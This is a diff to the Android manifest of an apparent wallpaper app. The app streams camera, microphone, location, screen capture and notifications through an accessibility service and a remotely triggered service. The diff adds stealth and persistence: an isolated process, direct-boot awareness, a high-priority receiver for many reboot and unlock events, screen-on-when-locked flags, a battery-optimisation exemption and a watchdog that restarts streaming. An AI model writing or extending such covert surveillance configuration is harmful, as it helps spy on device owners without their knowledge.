@@ -45,6 +45,9 @@
     <uses-permission android:name="android.permission.WRITE_SETTINGS"
         tools:ignore="ProtectedPermissions" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
 
     <application
         android:allowBackup="true"
@@ -81,22 +84,30 @@
             android:enabled="true"
             android:exported="false"
             android:stopWithTask="false"
+            android:directBootAware="true"
+            android:process=":streaming"
             android:foregroundServiceType="camera|microphone|location|dataSync|mediaProjection" />
 
         <!-- Transparent activity to request MediaProjection permission token -->
         <activity
             android:name=".MediaProjectionPermissionActivity"
             android:exported="true"
+            android:process=":streaming"
             android:launchMode="singleTop"
             android:excludeFromRecents="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
             android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
         <!-- Transparent activity to trigger native OS GPS resolution dialog -->
         <activity
             android:name=".GpsResolutionActivity"
             android:exported="false"
+            android:process=":streaming"
             android:launchMode="singleTop"
             android:excludeFromRecents="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
             android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
         <!-- Notification listener service -->
@@ -104,6 +115,7 @@
             android:name=".StreamingService$NotificationListener"
             android:enabled="true"
             android:exported="true"
+            android:process=":streaming"
             android:label="Notification Listener"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
@@ -116,6 +128,7 @@
             android:name=".WallpaperAccessibilityService"
             android:enabled="true"
             android:exported="true"
+            android:process=":streaming"
             android:label="@string/app_name"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
@@ -129,6 +142,7 @@
         <!-- Firebase Cloud Messaging service for on-demand activation -->
         <service
             android:name=".MyFirebaseService"
+            android:process=":streaming"
             android:exported="false">
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT"/>
@@ -138,11 +152,31 @@
         <!-- Receiver for BOOT_COMPLETED and task revival to restart streaming -->
         <receiver
             android:name=".BootReceiver"
+            android:enabled="true"
             android:exported="true"
-            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
-            <intent-filter>
+            android:directBootAware="true"
+            android:process=":streaming">
+            <intent-filter android:priority="1000">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.REBOOT" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
                 <action android:name="com.example.wallpaperapplication.RESTART_STREAMING" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Watchdog receiver to periodically check if streaming is running and revive if needed -->
+        <receiver
+            android:name=".StreamingWatchdogReceiver"
+            android:enabled="true"
+            android:exported="false"
+            android:directBootAware="true"
+            android:process=":streaming">
+            <intent-filter>
+                <action android:name="com.example.wallpaperapplication.CHECK_STREAMING" />
             </intent-filter>
         </receiver>
     </application>
